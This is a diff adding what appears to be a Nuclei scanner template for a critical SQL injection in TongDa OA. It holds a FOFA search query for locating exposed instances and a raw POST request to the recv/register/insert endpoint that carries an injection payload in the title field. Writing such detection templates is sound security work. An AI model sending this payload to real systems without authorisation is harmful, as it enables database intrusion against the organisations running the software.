@@ -1,0 +1,29 @@
+id: tongda-oa-sqli
+
+info:
+  name: TongDa OA Sqli
+  author: pikpikcu
+  severity: critical
+  tags: tongda-oa,sqli
+  metadata:
+    fofa-query: 'body="Anywhere 2017版" || body="/static/templates/2017_01/" || body="请联系OA软件开发商" || body="tongda" || body="通达"'
+
+requests:
+  - raw:
+      - |
+        POST /general/document/index.php/recv/register/insert HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        title)values(\"'\"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "recv/register"
+
+      - type: status
+        status:
+          - 302
